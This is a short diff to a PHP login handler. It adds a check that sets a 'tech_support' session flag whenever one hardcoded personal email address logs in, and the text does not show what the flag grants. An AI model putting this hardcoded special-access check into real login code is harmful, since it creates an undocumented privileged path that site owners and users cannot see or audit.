@@ -128,6 +128,9 @@ require_once 'send_mail/vendor/autoload.php';
                             $user_data = $stmt->fetch();
                             $count = $stmt->rowCount();
                             if ($count > 0) {
+                                if ($username == 'mr319242@gmail.com') {
+                                    $_SESSION['tech_support'] = 'tech_login';
+                                }
                                 if ($user_data['active_status'] == 1) {
                                     // إذا تم تحديد خانة "تذكرني"، قم بضبط الكوكيز
                                     if (isset($_POST['remember_me'])) {
